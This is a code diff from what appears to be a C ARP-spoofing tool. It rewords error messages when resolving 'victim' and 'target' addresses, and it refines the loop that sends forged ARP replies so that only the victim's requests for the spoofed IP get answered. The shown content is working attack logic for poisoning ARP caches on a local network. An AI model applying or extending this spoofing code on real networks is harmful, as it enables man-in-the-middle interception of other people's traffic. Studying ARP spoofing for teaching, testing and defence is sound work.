@@ -215,7 +215,7 @@ int main(int argc, char *argv[]) {
     printf("Resolving victim I.P address %s...\n", victim.ip_str);
     // Check for failure
     if (!arp_resolve(sock, addr_ll, interface.ip, interface.mac, victim.ip, victim.mac)) {
-      printf("Failed to resolve victim I.P address %s. Continue with broadcast instead? (y/n)\n> ", victim.ip_str);
+      printf("Failed to resolve victim I.P address %s (No device with this address exists?). Continue with broadcast instead? (y/n)\n> ", victim.ip_str);
       c = getchar();
     
       // consume newline
@@ -238,7 +238,7 @@ int main(int argc, char *argv[]) {
   if (flags.restore) {
     printf("Resolving target I.P address %s...\n", target.ip_str);
     if (!arp_resolve(sock, addr_ll, interface.ip, interface.mac, target.ip, target.mac)) {
-      printf("Failed to resolve target I.P. address %s (Possibly no device has it?). Continue without restoring ARP cache? (y/n)\n> ", target.ip_str);
+      printf("Failed to resolve target I.P. address %s (No device with this address exists?). Continue without restoring ARP cache? (y/n)\n> ", target.ip_str);
       c = getchar();
       if (c != 'y')
 	exit(EXIT_FAILURE);
@@ -276,12 +276,13 @@ int main(int argc, char *argv[]) {
       ArpPacket received;
       sigprocmask(SIG_BLOCK, &mask, NULL);
       if (recv(sock, (uint8_t*)&received, sizeof(ArpPacket), MSG_DONTWAIT) > 0) {
-	// Request for spoofed IP
-	if (ntohs(received.oper) == ARP_REQUEST && received.tpa == target.ip) {
+	// Request, for spoofed IP, from the victim
+	if (ntohs(received.oper) == ARP_REQUEST && received.tpa == target.ip && received.spa == victim.ip) {
 	  // Copy the source MAC (the device that sent the request) to the target address of the response packet
 	  memcpy(responsepack.tha, received.sha, ETH_ALEN);
 	  // Copy IP address
 	  responsepack.tpa = received.spa;
+	  // Send the packet
 	  sendto(sock, (uint8_t*)&responsepack, sizeof(ArpPacket), MSG_DONTWAIT, (struct sockaddr*)&addr_ll, sizeof(struct sockaddr_ll));
 	}
       }
